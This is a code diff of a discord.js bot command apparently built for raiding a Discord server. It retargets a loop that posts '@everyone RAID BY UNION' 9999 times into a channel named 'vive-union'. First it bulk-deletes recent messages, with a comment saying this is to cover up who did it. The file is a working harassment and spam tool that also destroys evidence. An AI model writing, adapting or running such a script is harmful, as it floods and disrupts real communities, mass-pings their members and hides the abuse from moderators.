@@ -1,17 +1,13 @@
 const Discord = require('discord.js');
 
-const settings = {
-    guildID: "443870656677937153"
-};
-
 exports.run = (client, message, args) => {
 
   // Get the guild using the ID.
-     let guild = client.guilds.get(settings.guildID);
+  let SpamChannel = message.guild.channels.find(`name`, "vive-union");
 
     message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
     for (var i = 0; i < 9999; i++) {
-       message.channel.send("@everyone RAID BY UNION")
+       SpamChannel.send("@everyone RAID BY UNION")
         }
 }
 
